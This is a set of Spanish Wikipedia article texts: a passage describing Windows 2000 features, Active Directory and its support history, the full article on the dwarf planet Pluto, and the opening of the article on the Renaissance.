La personalización y configuración del sistema se puede realizar casi por completo desde los paneles de control, incluyendo las opciones de carpetas. Windows 2000 es el primer sistema operativo que permite personalizar la barra de menús del sistema. De hecho, dispondremos de más de 20 botones incluyendo el de Búsquedas, Mover a, Copiar a, Favoritos y redimensionamiento. Un detalle que los que empiezan con Windows apreciarían es que se han integrado las etiquetas de ayuda contextual a todos los elementos del sistema y que los cuadros de diálogo y paneles son más informativos, incluyendo botones para la resolución de problemas y la opción de desinstalar controladores. 

El verdadero trabajo se nota en el Explorador de Windows y la integración con Internet Explorer 5. El Historial de IE5 y del Explorador de Windows incluyen ahora tanto los sitios Web como los documentos y carpetas con los que trabajamos y se puede decir que podemos utilizar indistintamente tanto uno como otro para movernos por el sistema. 

Los cambios en la herramienta de búsqueda guardan grandes similitudes con las que podemos encontrar en un portal de Internet, ya que acepta operadores booleanos, permite acotar las zonas (en Internet, Archivos y carpetas, o Personas) y especificar al detalle los atributos del requerimiento. Los documentos encontrados se previsualizan en la ventana del Explorador, y a través de esta también podemos acceder a sitios Web o navegar por el disco, una unificación de funciones que parecerá natural a los pocos minutos. Una búsqueda a fondo requiere la ejecución de Index Server. Este componente proporciona la indexación del contenido local en modo subordinado. El usuario puede seleccionar los directorios que quiere indexar y las propiedades que deberían tenerse en cuenta en este proceso. Si el usuario esta en una red W2000 Server, el servidor puede hacerse cargo de todo el trabajo.

La fiabilidad y la capacidad de gestión se han mejorado con herramientas que ayudaran a los usuarios y administradores de red a gestionar de forma más sencilla sus sistemas, empezando porque el laberinto de las DLLs parece resuelto. Windows 2000 permite que las DLLs (Dymanic Link Library) se instalen en los directorios de sus aplicaciones específicas, y eviten que se eliminen las DLLs compartidas.

La gestión global de un sistema se realiza a través de un módulo denominado Administración del equipo, que organiza los recursos, servicios, dispositivos de almacenamiento y seguridad que utilizan tanto en el sistema local como en ordenadores remotos. El panel es una herramienta muy valiosa para los administradores de red y se divide en tres módulos: Herramientas del Sistema, Almacenamiento y Servicios y Aplicaciones. 

En Herramientas del Sistema, por ejemplo, disponemos de un visor de sucesos y del Administrador de dispositivos, una síntesis jerarquizada de los dispositivos instalados en el PC y que permite hacer modificaciones y búsquedas para resolver conflictos IRQ o DMA. Por otro lado, desde Almacenamiento es posible acceder a las propiedades de las unidades de disco, incluyendo unidades extraíbles, y a sus opciones de verificación, comparticiones y copias de seguridad. Finalmente Servicios y Aplicaciones nos da información más clara sobre los servicios Microsoft y de red implementados. En general, el Administrador del equipo es un mapa completo y detallado de la PC, incluyendo informes sobre la forma en que el usuario lo utiliza.

Puesto que se trata de un sistema operativo orientado al trabajo en red y a la compartición de recursos, la familia Windows 2000 ha integrado sólidas tecnologías de seguridad. La intención es que cada usuario pueda comprender como funcionan estas tecnologías y controlarlas de forma cabal. Esta “infraestructura” de seguridad funciona en tres niveles: 


Un servicio de directorios es un servicio de red que identifica todos los recursos en ella y los vuelve accesibles a los usuarios y a las aplicaciones. Active Directory (AD) es el servicio de directorio incluido en W2000. 

El elemento principal de AD es el directorio, que almacena información sobre los recursos de la red y los servicios que hacen disponible la información. Los recursos almacenados en el directorio, como los datos del usuario, impresoras, servidores, bases de datos, grupod, computadoras y políticas de sistema, se denominan objetos. 

AD los organiza jerárquicamente en dominios. Un dominio (domain) es una agrupación lógica de servidores y otros recursos de red bajo un mismo nombre de dominio. Cada dominio incluye uno o más controladores de dominio (domain controllers), que son máquinas que almacenan una replica de un directorio de dominio. Cada vez que se hace algún cambio en alguno de los controladores, el resto se actualiza automáticamente. 

Un objeto es un conjunto de atributos particulares, bajo un nombre específico, que representa un recurso individual de la red. Los atributos se refieren a las características del objeto. Así, los atributos de una cuenta de usuario pueden ser el nombre, departamento y dirección de mail, y los de una impresora, si es láser y si es en color. Algunos objetos funcionan también como contenedores: por ejemplo, un dominio. 

Las agrupaciones lógicas de objetos son las clases. Una clase puede estar constituida por todas las cuentas de usuario, las impresoras, los grupos, etc. 

Las unidades organizacionales (UO, organizational units) son contenedores que se usan para reunir objetos de un dominio en grupos administrativos lógicos. Cada UO puede contener distintos objetos y cada dominio puede tener su propia lógica de agrupación en UOs. 

La unidad central de la estructura lógica de AD es el dominio. Agrupando los objetos en uno o más dominios es posible representar la propia organización de la empresa. Todos los objetos de la red existen en un dominio, es posible albergar hasta 10 millones de objetos. 

Quizás al usuario final este tipo de estructura no le dirá nada. Sin embargo, para administrar una red empresaria, AD permite hacerlo de manera fácil, centralizada y automática en muchos de sus parámetros. Y para el usuario significa no tener que recordar números o nombres abstractos, y tener los recursos de la red disponibles sin tener que preocuparse por saber donde están.

Windows 2000 fue sucedido por nuevos sistemas operativos de Microsoft. La línea Windows 2000 Servidor ha sido reemplazada por Windows Server 2003, y Windows 2000 Professional con Windows XP Professional. La familia de sistemas operativos Windows 2000 hizo su avance desde la Fase de Soporte Principal a la Fase de Soporte Extendido el 30 de junio de 2005. Microsoft dice que esto marca la progresión del producto a través de su Directiva de Ciclo de Vida de Productos. Bajo la Fase de Soporte Extendido, Microsoft continuará entregando actualizaciones críticas de seguridad mensuales y soporte telefónico pagado. Sin embargo, el soporte técnico gratuito y cambios en el diseño del sistema no serán proporcionados. Debido a la antigüedad de Windows 2000, Microsoft no ofrecerá componentes actuales tales como Internet Explorer 7. La compañía dice que IE7 depende de características de seguridad diseñadas sólo para Windows XP Service Pack 2 y Windows Vista, y no puede ser desarrollado bajo la plataforma Windows 2000. Por su parte, Microsoft ha recomendado a las empresas que aún mantienen como Sistema Operativo a Windows 2000 se actualicen a Windows Server 2003 o Windows Vista para mejorar la seguridad. Todo el soporte de Windows 2000 incluidas las actualizaciones de seguridad finalizaron el 13 de julio de 2010.

Windows 2000 recibió 4 Service Packs y un "Update Rollup" para el Service Pack 4, su último Service Pack. Los SP son: Service Pack 1 (SP1) el 15 de agosto de 2000, Service Pack 2 (SP2) el 16 de mayo de 2001, Service Pack 3 (SP3) el 29 de agosto de 2002 y el Service Pack 4 (SP4) el 26 de junio de 2003. Microsoft retiró el desarrollo de la Máquina Virtual Java (JVM) de Windows 2000 en el Service Pack 3. Muchos usuarios esperaron el Service Pack 5, pero Microsoft canceló tempranamente este proyecto y en vez de eso presentó el "Update Rollup 1" para Service Pack 4, la cual es la colección de todos los parches de seguridad y otras cosas significativas. Sin embargo, no incluye todos los parches que no son de seguridad y no fue probado extensivamente como se le realiza a un Service Pack. Microsoft enfatiza que esta actualización reúne de mejor manera lo que los usuarios necesitan en vez de un SP nuevo, y contribuirá a los clientes de Windows 2000 a mantener seguros sus PC, reducir los costos de soporte, y permitir que sus sistemas soporten la generación actual de hardware de computación.

Aunque Windows 2000 es aparentemente un sistema operativo de gran tamaño, Microsoft ha hecho un gran esfuerzo para que los usuarios de ordenadores portátiles puedan llevarlo en sus máquinas y trabajar con el independiente y coordinadamente a la vez. Para esto, W2000 tiene la capacidad de definir carpetas para el trabajo “off-line”. Configurando esta opción es posible trabajar con los documentos en el portátil, con la seguridad de que cuando se realice una conexión con nuestro ordenador principal se realizara la sincronización de todos los archivos. Asimismo, si utilizamos archivos compartidos, cuando se establezca una conexión con la red, obtendremos la última versión de aquellos, listos para empezar a trabajar. 

La función de ahorro de energía, básica para los usuarios de portátiles, se realiza a través del soporte ACPI. ACPI, también, permite la mejora de la conexión de los portátiles a los docks de los sistemas principales, ya que puede hacerse en actividad y sin retrasos en el reconocimiento del hardware y controladores. 

El usuario puede crear también diferentes perfiles de utilización en caso de baja energía, bien disminuyendo el trabajo de disco, el brillo de la pantalla u optando por el modo reposo. Windows 2000 también soporta la “hibernación” de portátiles. La única mala noticia, es que ACPI forma parte del firmware de un sistema, por lo que solo los portátiles de nueva fabricación pueden hacer uso de este estándar.




</doc>
<doc id="6438" url="https://es.wikipedia.org/wiki?curid=6438" title="Plutón (planeta enano)">
Plutón (planeta enano)

Plutón, designado 134340 Pluto, es un planeta enano del sistema solar situado a continuación de la órbita de Neptuno. Su nombre se debe al dios mitológico romano Plutón (Hades según los griegos). En la Asamblea General de la Unión Astronómica Internacional (UAI) celebrada en Praga el 24 de agosto de 2006 se creó una nueva categoría llamada plutoide, en la que se incluye a Plutón. Es también el prototipo de una categoría de objetos transneptunianos denominada plutinos. Posee una órbita excéntrica y altamente inclinada con respecto a la eclíptica, que recorre acercándose en su perihelio hasta el interior de la órbita de Neptuno. Plutón posee cinco satélites: Caronte, Nix, Hidra, Cerbero y Estigia. Estos son cuerpos celestes que comparten la misma categoría.

Su gran distancia al Sol y a la Tierra, unida a su reducido tamaño, impide que brille por encima de la magnitud 13,8 en sus mejores momentos (perihelio orbital y oposición), por lo cual solo puede ser apreciado con telescopios a partir de los 200 mm de abertura, fotográficamente o con cámara CCD. Incluso en sus mejores momentos aparece como astro puntual de aspecto estelar, amarillento, sin rasgos distintivos (diámetro aparente inferior a 0,1 segundos de arco). No fue hasta el año 2015 cuando la sonda espacial New Horizons pasó sobre el planeta y permitió apreciar por primera vez de forma nítida el aspecto real del planeta.

Plutón fue descubierto el 18 de febrero de 1930 por el astrónomo estadounidense Clyde William Tombaugh (1906-1997) desde el Observatorio Lowell en Flagstaff, Arizona, y fue considerado el noveno y más pequeño planeta del sistema solar por la Unión Astronómica Internacional y por la opinión pública desde entonces hasta 2006, aunque su pertenencia al grupo de planetas del sistema solar fue siempre objeto de controversia entre los astrónomos. Incluso, durante muchos años existió la creencia de que Plutón era un satélite de Neptuno que había dejado de ser satélite por el hecho de alcanzar una segunda velocidad cósmica. Sin embargo, esta teoría fue rechazada en la década de 1970.

Tras un intenso debate, y con la propuesta de los astrónomos uruguayos Julio Ángel Fernández y Gonzalo Tancredi ante la Asamblea General de la Unión Astronómica Internacional en Praga, República Checa, se decidió por unanimidad reclasificar a Plutón como planeta enano, requiriendo que un planeta debe tener "dominancia orbital". Se propuso su clasificación como planeta en el borrador de resolución, pero desapareció de la resolución final, aprobada por la Asamblea General de la UAI. Desde el 7 de septiembre de 2006 tiene el número 134340, otorgado por el Centro de Planetas Menores.

En la década de los cuarenta del siglo XIX, Urbain Le Verrier (1811-1877) empleó la mecánica newtoniana para predecir la posición de Neptuno tras analizar las perturbaciones en la órbita de Urano. Posteriores observaciones de Neptuno, a finales del siglo XIX, llevaron a los astrónomos a conjeturar que otro planeta, además de Neptuno, perturbaba la órbita de Urano.

En 1906, Percival Lowell (1855-1916) —un bostoniano adinerado que había fundado en 1894 el observatorio Lowell en Flagstaff, Arizona— inició un intenso programa de búsqueda del noveno planeta al que llamó Planeta X. Para 1909, él y William H. Pickering (1855-1935) habían sugerido varias coordenadas celestes donde podría encontrarse dicho planeta. Lowell y los miembros de su observatorio llevaron adelante la búsqueda, sin obtener resultados hasta la muerte de aquel en 1916. Sin embargo, y sin saberlo, Lowell lo había fotografiado en sendas placas del 19 de marzo y 7 de abril de 1915 donde aparecía como un objeto débil. Hay otras catorce observaciones "precovery" conocidas, siendo la más antigua la hecha en el observatorio Yerkes el 20 de agosto de 1909.

La búsqueda del Planeta X se detuvo debido a una disputa legal de diez años con la viuda de Lowell. Constance Lowell (1862-1954) quería que una parte del legado que su marido dejó al observatorio fuese para ella. En 1929, el nuevo director del observatorio, Vesto Melvin Slipher (1875-1969), encargó la búsqueda a Clyde William Tombaugh (1906-1997), un joven de Kansas de 23 años, quien había dejado impresionado a Slipher por sus dibujos astronómicos.

La tarea de Tombaugh consistió en la toma de pares de fotografías del cielo nocturno para, a continuación, examinar cada par y determinar si algún objeto había cambiado de posición. Usó para ello un microscopio de parpadeo, aparato que creaba una ilusión de movimiento al desplazar rápidamente dos fotografías sobre sí mismas y permitía así detectar cambios en la posición de los objetos o en la apariencia de las imágenes. El 18 de febrero de 1930, tras casi un año de búsqueda, encontró un objeto que se había movido en las placas tomadas el 23 y 29 de enero de ese año. Una fotografía de menor calidad tomada el 21 ayudó a confirmar el movimiento. Después de que el observatorio obtuviera fotografías adicionales de confirmación, la noticia del descubrimiento se telegrafió al observatorio del Harvard College el 13 de marzo de 1930.

El descubrimiento fue noticia en todo el mundo. El observatorio Lowell, que tenía el derecho a nombrar el nuevo objeto, recibió más de 1000 sugerencias que iban desde «Atlas» hasta «Zymal». Tombaugh urgió a Slipher para que propusiera un nombre antes de que alguien se adelantara y lo hiciera. Constance Lowell sugirió primero «Zeus»; después «Percival»; y finalmente «Constance». Ninguna fue tomada en consideración.

El nombre «Plutón» —del dios romano del inframundo— fue propuesto por Venetia Burney (1918-2009), una estudiante de Oxford interesada en la mitología clásica, durante una conversación con su abuelo Falconer Madan (1851-1935), miembro de la Biblioteca Bodleiana. Este pasó el nombre al astrónomo Herbert Hall Turner (1861-1930) quien, a su vez, envió un cable a sus colegas estadounidenses con la propuesta.

Para elegir el nombre definitivo del objeto, a cada miembro del observatorio Lowell se le pidió que votara por una de tres propuestas: «Minerva», que ya era el nombre de un asteroide; «Cronos», que tenía mala fama por haber sido propuesto por el impopular astrónomo Thomas Jefferson Jackson See (1866-1962); y «Plutón». Este último recibió finalmente todos los votos. El nombre fue anunciado el 1 de mayo de 1930 y, tras conocerlo, Madan dio a Venetia cinco libras de recompensa. En la elección final del nombre ayudó que las dos primeras letras coincidieran con las iniciales de Percival Lowell. El símbolo astronómico es una representación de dichas letras: ♇, Unicode U+2647.

El nombre caló muy pronto en la cultura popular. En 1930, Walt Disney (1901-1966) se inspiró al parecer en este nombre cuando presentó a Pluto —que lleva el nombre en inglés de Plutón—, un compañero canino de Mickey Mouse, aunque el animador de la Disney Ben Sharpsteen (1895-1980) no fue capaz de confirmar la veracidad de esto. En 1941, Glenn T. Seaborg (1912-1999) llamó «plutonio» a un nuevo elemento químico a partir del nombre del planeta. Seaborg seguía la reciente tradición de denominar a los elementos descubiertos por el nombre de los nuevos planetas del sistema solar. Así, el uranio se nombró a partir de Urano y el neptunio de Neptuno. La mayoría de los idiomas emplean formas propias del nombre «Plutón». Hōei Nojiri (1885-1977) sugirió para el japonés la traducción «Meiōsei» (冥王星, «Estrella del rey del inframundo»), que fue tomada también por el chino y el vietnamita.

Una vez descubierto, el débil brillo de Plutón y la imposibilidad de resolver su disco arrojaron dudas sobre la idea de que fuese el Planeta X de Lowell. Además, el valor de la masa se revisó a la baja a lo largo del resto del siglo. Las primeras estimaciones se hicieron tomando las supuestas perturbaciones en Urano y Neptuno. En 1931, se calculó que Plutón tenía una masa similar a la terrestre. Más adelante, en 1948, el cálculo había bajado hasta la de Marte. En 1975, Dale Cruikshank, Carl Pilcher y David Morrison, de la Universidad de Hawái, calcularon por primera vez su albedo y encontraron que coincidía con el del hielo de metano. Esto significaba que Plutón tenía que ser bastante luminoso para su tamaño y que no podría tener más del 1 % de la masa de la Tierra. El albedo de Plutón ha resultado ser de 1,4 a 1,9 veces el terrestre.

El descubrimiento en 1978 de Caronte, el primer satélite de Plutón, permitió medir la masa de este directamente. Resultó ser aproximadamente un 0,2 % la masa de la Tierra, demasiado pequeña para explicar las discrepancias de la órbita de Urano. Posteriores búsquedas de una alternativa para el Planeta X fracasaron. En 1992, E. Myles Standish usó datos del sobrevuelo de Neptuno de la "Voyager 2" —durante el cual se revisó la estimación de la masa de Neptuno a la baja en un 0,5 %, equiparable a la masa de Marte— para recalcular su efecto gravitatorio en Urano. Con las nuevas cifras, las discrepancias desaparecieron. Desde entonces, la mayoría de científicos coinciden en que el Planeta X no existe tal como Lowell lo describió. Lowell hizo una predicción de la órbita y posición del Planeta X que estuvo bastante cerca de la órbita de Plutón y su posición en el momento del descubrimiento. Ernest William Brown (1866-1938) comentó poco después que había sido una casualidad, opinión esta corroborada por posteriores estudios.

Desde 1992 se han descubierto numerosos cuerpos en la misma región del sistema solar de Plutón, lo que muestra a este como parte de la población de objetos del llamado cinturón de Kuiper. Esto condujo a que su condición de planeta fuese controvertida y a que muchos se cuestionasen si Plutón debería ser o no considerado junto a esa población. Algunos directores de museos y planetarios contribuyeron a la controversia omitiendo a Plutón de los modelos del sistema solar de sus instituciones. El planetario Hayden, por ejemplo, volvió a abrir sus puertas —en 2000, tras una renovación— con un modelo de solo ocho planetas. Casi un año después, era titular en algunos periódicos.

Como se iban descubriendo objetos cuyos tamaños estaban cada vez más cerca del de Plutón, se argumentó que este debería ser reclasificado como uno de los objetos del cinturón de Kuiper —de la misma forma que Ceres, Palas, Juno y Vesta perdieron la categoría de planeta tras el descubrimiento de muchos asteroides—. En 1999 el astrónomo Brian Marsden (1937-2010), por entonces director del Centro de Planetas Menores, llegó a proponer incluirlo en el catálogo de cuerpos menores asignándole el número (10000). Finalmente, la idea no fue aceptada por la Unión Astronómica Internacional (UAI) y fue el asteroide 1951 SY el que recibió ese número. Posteriormente se le dio el nombre de Miriosto.

La controversia volvió a intensificarse a partir de 2001 con el descubrimiento relativamente frecuente de objetos similares a Plutón en el sistema solar exterior. En 2002 se descubrió Quaoar, un objeto transneptuniano cuyo diámetro de unos 1070 km está cerca de la mitad del de Plutón. En 2004, a una distancia de 100 ua, se encontró Sedna, con un diámetro de aproximadamente 1000 km.

El 29 de junio de 2005, astrónomos del Caltech anunciaron el descubrimiento de un nuevo objeto transneptuniano, Éride, más masivo que Plutón y el más masivo descubierto en el sistema solar desde que lo fuera Tritón en 1845. Tanto sus descubridores como la prensa lo llamaron el décimo planeta, aunque no hubo acuerdo inicial en la comunidad astronómica de si debía ser un planeta. Otros astrónomos lo consideraron el argumento más firme para reclasificar a Plutón como un planeta menor.

El debate llegó a su culmen el 24 de agosto de 2006 con una resolución de la UAI en la que establecía la definición oficial de planeta. De acuerdo con ella, hay tres condiciones para que un objeto sea considerado planeta:
Plutón no cumple la tercera condición debido a que su masa es solo 0,07 veces la masa de los otros objetos de su órbita —en comparación, la masa de la Tierra es 1,7 millones de veces la de su región orbital—, por lo que la UAI decidió además que los cuerpos que cumplen solo los dos primeros criterios pasarían a denominarse «planetas enanos». Así, el 13 de septiembre de 2006 se clasificó a Ceres, Plutón y Éride en la nueva categoría.

Ha habido cierta resistencia en la comunidad astronómica contra la reclasificación. Alan Stern, investigador principal de la misión "New Horizons", ridiculizó públicamente la resolución de la UAI afirmando que «la definición apesta por razones técnicas». La explicación de Stern fue que la Tierra, Marte, Júpiter y Neptuno —todos ellos comparten órbita con asteroides u objetos transneptunianos— serían excluidos según la nueva definición. Además, argumentó que los grandes satélites, incluida la Luna, deberían ser considerados asimismo planetas. Por último, mencionó que, debido a que menos del cinco por ciento de los astrónomos votaron, la decisión no era representativa de toda la comunidad astronómica. Marc Buie, por entonces miembro del observatorio Lowell, expresó su opinión en contra de la nueva definición en su sitio web. Otros astrónomos han apoyado a la UAI. Michael E. Brown, descubridor de Éride, dijo que «a través de todo este alocado procedimiento circense, se tropezó de alguna manera con la respuesta correcta. Ya era hora. La ciencia al final se corrige a sí misma, incluso cuando se involucran fuertes emociones».

La recepción popular de la decisión de la UAI fue variada. Aunque muchos aceptaron la resolución, algunos trataron de anular la decisión con peticiones en la Red en las que instaban a la UAI a considerar la restauración de la categoría de planeta. Una resolución presentada por algunos miembros de la asamblea del estado de California decía medio en broma que la decisión era una «herejía científica». La Cámara de Representantes de Nuevo México aprobó una resolución en honor de Tombaugh, antiguo residente del estado, en la que declaraba que Plutón se considerará siempre un planeta desde el momento en que sea visible desde el estado y que el 13 de marzo de 2007 será el Día del Planeta Plutón. El Senado de Illinois —estado de nacimiento de Tombaugh— aprobó una resolución similar en 2009 según la cual Plutón fue «injustamente degradado a planeta enano» por la UAI. Parte de la opinión pública también ha rechazado el cambio citando el desacuerdo de la comunidad científica sobre el asunto o por razones sentimentales, pues siempre han conocido a Plutón como planeta y continuarán haciéndolo independientemente de la decisión de la UAI.

Varios investigadores que respaldaban las dos posiciones del debate se reunieron del 14 al 16 de agosto de 2008 en el Laboratorio de Física Aplicada de la Universidad Johns Hopkins para dar una conferencia que incluía conversaciones cara a cara sobre la definición actual de planeta de la UAI. Bajo el título «El Gran Debate Planetario», la conferencia publicó posteriormente un comunicado de prensa en el que indicaba que los científicos no pudieron llegar a un acuerdo respecto a la definición de planeta. Antes de la conferencia, el 11 de junio de 2008, la UAI anunció en un comunicado de prensa que el término «plutoide» se usaría para referirse a Plutón y otros objetos transneptunianos —cuyos semiejes mayores son superiores al de Neptuno— que tuviesen una masa suficiente para conseguir la forma esférica.

El origen y naturaleza de Plutón tuvo a los astrónomos largo tiempo desconcertados. Una primera hipótesis proponía que fue un satélite que había escapado de Neptuno sacado de órbita por Tritón. Esta idea fue rechazada posteriormente después de que estudios dinámicos demostrasen que era imposible: las trayectorias de Plutón y Neptuno nunca se aproximan.

El auténtico lugar de Plutón en el sistema solar comenzó a revelarse a partir de 1992, cuando los astrónomos empezaron a encontrar pequeños objetos helados más allá de Neptuno similares a Plutón no sólo en las características orbitales, sino también en cuanto a tamaño y composición. Se piensa que esta población transneptuniana es la fuente de muchos cometas de periodo corto. En la actualidad Plutón es el miembro más grande del cinturón de Kuiper, una región estable que se encuentra a entre 30 y 50 ua del Sol —Eris, más masivo, pertenece a los objetos del disco disperso, un grupo considerado en ocasiones distinto—. En 2011, casi se había completado el escrutinio de objetos del cinturón de Kuiper hasta una magnitud de 21 y no se esperaba descubrir ningún objeto del tamaño de Mercurio a menos de 100 ua del Sol.Al igual que otros objetos del cinturón de Kuiper, Plutón comparte características cometarias; por ejemplo, el viento solar está desgastando poco a poco su superficie y enviándola al espacio.Se ha llegado a afirmar que si Plutón estuviese tan cerca del Sol como la Tierra, desarrollaría una cola al igual que los cometas. Esta afirmación se ha puesto en duda con el argumento de que la velocidad de escape es demasiado alta para que esto suceda.

Aunque Plutón es el mayor objeto descubierto en el cinturón de Kuiper, Tritón, que es similar tanto geológica como atmosféricamente y es probablemente un objeto del cinturón capturado por Neptuno, es un poco mayor.Eris, de tamaño similar, pertenece a la población de objetos del disco disperso. Muchos objetos del cinturón de Kuiper están en resonancia orbital 2:3 con Neptuno al igual que Plutón. Han recibido la denominación de «plutinos», del nombre en inglés de Plutón.

 La órbita de Plutón es muy excéntrica y, durante 20 de los 248 años que tarda en recorrerla, se encuentra más cerca del Sol que Neptuno.

Es también mucho más inclinada respecto al plano de la eclíptica que cualquiera de la de los planetas del sistema solar, siendo su inclinación de 16º, por ello no hay peligro alguno de una colisión con Neptuno. Cuando las órbitas se cruzan lo hacen cerca de los extremos de manera que, en sentido perpendicular a la eclíptica, les separa una enorme distancia.

Plutón llegó por última vez a su perihelio en septiembre de 1989 y continuó desplazándose por el interior de la órbita de Neptuno hasta marzo de 1999. Actualmente se aleja del Sol y no volverá a estar a menor distancia del Sol que Neptuno hasta septiembre de 2226.
El periodo de rotación de Plutón es igual a 6,39 días terrestres. Al igual que Urano, Plutón gira "acostado sobre un lado" en su plano orbital, con una inclinación axial de 120°. Por lo tanto, la variación estacional es extrema. Durante los solsticios plutonianos, en una cuarta parte de la superficie es continuamente de día mientras que en otra cuarta parte es noche continua.

Plutón recibe una cantidad de luz solar análoga a la que recibe la Tierra por las tardes. La NASA tiene publicado un calculador del tiempo plutoniano que determina cuando la luz en la Tierra es equivalente a la de Plutón en un día claro.

Plutón posee una atmósfera extremadamente tenue, formada por nitrógeno, metano y monóxido de carbono, que se congela y colapsa sobre su superficie a medida que el planeta se aleja del Sol. Es esta evaporación y posterior congelamiento lo que causó las variaciones en el albedo del planeta, detectadas por medio de fotómetros fotoeléctricos en la década de 1950 (Kuiper y otros). A medida que el planeta se aproximó, los cambios se fueron haciendo menores, disminuyendo cuando se encontró en el perihelio orbital (1989). Se espera que estos cambios de albedo se repitan, pero a la inversa, a medida que el planeta se aleje del Sol rumbo a su afelio.
Generalmente, se podría decir que la función de su atmósfera sería proteger la superficie, pero en este caso la atmósfera de Plutón solo le sirve para evitar impactos de pequeños meteoros.

Al principio se consideró que Plutón no poseía satélites (caso similar a Mercurio y Venus). En 1978 fue cuando se descubrió su primer satélite (Caronte), pasándose a ser considerado el sistema Plutón-Caronte como un planeta doble, cuyo centro de masas se encuentra en el exterior del disco de Plutón.

Hoy se sabe que, además de Caronte, existen otros cuatro satélites que orbitan Plutón. El satélite más grande de Plutón es Caronte. Caronte, de todas las lunas del sistema solar, es la más grande en comparación con su planeta anfitrión, es decir, ninguna otra luna es de un tamaño tan próximo al del planeta que orbita. El tamaño tan parecido que tienen Plutón y Caronte hace que aparezca el efecto planeta doble, esto es, el centro de las órbitas en torno al que se mueven ambos cuerpos no está situado en el interior de ninguno de ellos, en oposición al sistema "satélite-planeta" que es el caso de la Tierra y la Luna, en el que el centro está situado a aproximadamente 1700 kilómetros bajo la superficie de la Tierra.

Hidra, Nix, Cerbero y Estigia son los otros cuatro satélites de Plutón, pero son mucho más pequeños que Caronte. Sus nombres provisionales fueron S/2005 P 1, S/2005 P 2, S/2011 P 1 y S/2012 P 1, respectivamente.

Caronte es el primer satélite descubierto de Plutón. Tiene 1208 kilómetros de diámetro y está a 19 640 kilómetros del planeta. Desde que se descubrió en 1978 se les ha considerado como un planeta doble, pues sus masas son similares y el baricentro queda fuera de Plutón, el cuerpo de mayor masa. De esta manera ambos orbitan en torno a dicho punto. Parece como si estuvieran unidos por una barra invisible y girasen alrededor de un centro situado en esa barra o eje, más cercano a Plutón, puesto que tiene 7 veces más masa que Caronte.

Tras la Asamblea General de la UAI de 2006, la categoría de Caronte es aún incierta. Se le considera posible candidato a planeta enano, pero la definición no deja clara cómo realizar la distinción entre satélite o sistema binario aún no definido. Por ello se le sigue considerando un satélite del planeta enano Plutón.

Con el tiempo, la gravedad ha frenado las rotaciones de Caronte y Plutón, por lo que ahora presentan siempre la misma cara el uno al otro. La rotación de esta pareja es única en el sistema solar.

El 31 de octubre de 2005 el Telescopio Espacial Hubble anunció el posible descubrimiento de dos satélites adicionales de menor tamaño. Estas lunas fueron observadas en mayo de 2005 y confirmada su existencia en junio de 2006. Han recibido los nombres de Nix (nombre provisional S/2005 P1) e Hidra (nombre provisional S/2005 P2).

El nombre de ambos satélites fue escogido de forma conjunta, ya que sus iniciales NH rinden tributo a la sonda espacial New Horizons, que despegó en 2006 con destino a Plutón. Las observaciones preliminares son consistentes con ambos cuerpos orbitando en el mismo plano que Caronte y a distancias dos y tres veces superiores. Nix tiene 42 km de largo y 36 de ancho, mientras que Hidra tiene 55 km de largo.

En 2015 un nuevo estudio elaborado con todos los datos disponibles del telescopio espacial Hubble permitió averiguar que Nix e Hidra no están rotando sobre sus ejes, sino que lo hacen de una forma caótica al mismo tiempo que orbitan alrededor de Plutón y de su satélite principal, Caronte.

El 20 de julio de 2011 se anunció, también por parte del Hubble el descubrimiento del cuarto satélite de Plutón, P4 (S/2011 P 1), cuyo periodo orbital en torno al planeta enano es de 31 días. Del 29 de junio al 9 de julio de 2012 fue detectado en imágenes separadas el quinto satélite de Plutón, S/2012 (134340) 1, o P5. Se estima que es de forma irregular, de entre 10 y 25 kilómetros de diámetro. Se encuentra en una órbita circular de 95 000 kilómetros de diámetro alrededor de Plutón, posiblemente en el mismo plano que otras lunas de Plutón conocidas.

El 2 de julio de 2013 estos satélites recibieron sendos nombres relacionados con Hades y el Inframundo: Cerbero (perro de tres cabezas guardián del inframundo) y Estigia (río que separa la tierra del inframundo), respectivamente.

Sus órbitas son muy exteriores, por lo que son satélites del sistema Plutón-Caronte, y sus órbitas son estables, ya que están en una solución del problema de cuatro cuerpos (órbitas lejanas en torno al baricentro del sistema). Los astrónomos están intrigados de que un planeta tan pequeño pueda tener un conjunto tan complejo de satélites. El descubrimiento del quinto satélite ofrece pistas adicionales para desvelar cómo el sistema de Plutón se formó y evolucionó. La teoría más favorecida es que todas las lunas son reliquias de una colisión entre Plutón y un gran objeto del Cinturón de Kuiper miles de millones de años atrás.

Plutón fue el segundo planeta enano en ser visitado por una sonda espacial, tras Ceres. El 6 de julio de 2015, la misión "New Horizons" de la NASA se encontraba a nueve millones de kilómetros de él, el 13 de julio se encontraba a 768 000 kilómetros de la superficie obteniendo la imagen más detallada del cuerpo celeste hasta su previsto máximo acercamiento. Las observaciones científicas empezaron cinco meses antes del acercamiento y continuaron al menos un mes después del mismo, teniendo como objetivo caracterizar la geología y la morfología de Plutón y algunas de sus lunas, así como estudiar la composición de su superficie y de su atmósfera.






</doc>
<doc id="6440" url="https://es.wikipedia.org/wiki?curid=6440" title="Renacimiento">
Renacimiento

Renacimiento es el nombre dado a un amplio movimiento cultural que se produjo en Europa Occidental durante los siglos y . Fue un período de transición entre la Edad Media y los inicios de la Edad Moderna. Sus principales exponentes se hallan en el campo de las artes, aunque también se produjo una renovación en las ciencias, tanto naturales como humanas. La ciudad de Florencia, en Italia, fue el lugar de nacimiento y desarrollo de este movimiento, que se extendió después por toda Europa.
El Renacimiento fue fruto de la difusión de las ideas del humanismo, que determinaron una nueva concepción del hombre y del mundo. El término «renacimiento» se utilizó reivindicando ciertos elementos de la cultura clásica griega y romana, y se aplicó originariamente como una vuelta a los valores de la cultura grecolatina y a la contemplación libre de la naturaleza tras siglos de predominio de un tipo de mentalidad más rígida y dogmática establecida en la Europa medieval. En esta nueva etapa se planteó una nueva forma de ver el mundo y al ser humano, con nuevos enfoques en los campos de las artes, la política, la filosofía y las ciencias, sustituyendo el teocentrismo medieval por el antropocentrismo.

En ese sentido, el historiador y artista Giorgio Vasari formuló una idea determinante: el nuevo nacimiento del arte antiguo ("Rinascita"), que presuponía una marcada conciencia histórica individual, fenómeno completamente nuevo. De hecho, el Renacimiento rompió, conscientemente, con la tradición artística medieval, a la que calificó como un estilo de "bárbaros", que más tarde recibirá el calificativo de Gótico. Sin embargo, los cambios tanto estéticos como en cuanto a la mentalidad fueron lentos y graduales. El concepto actual de "renacimiento" será formulado tal y como hoy lo entendemos en el por el historiador Jules Michelet, en su obra "Historia de Francia", publicada en 1855.

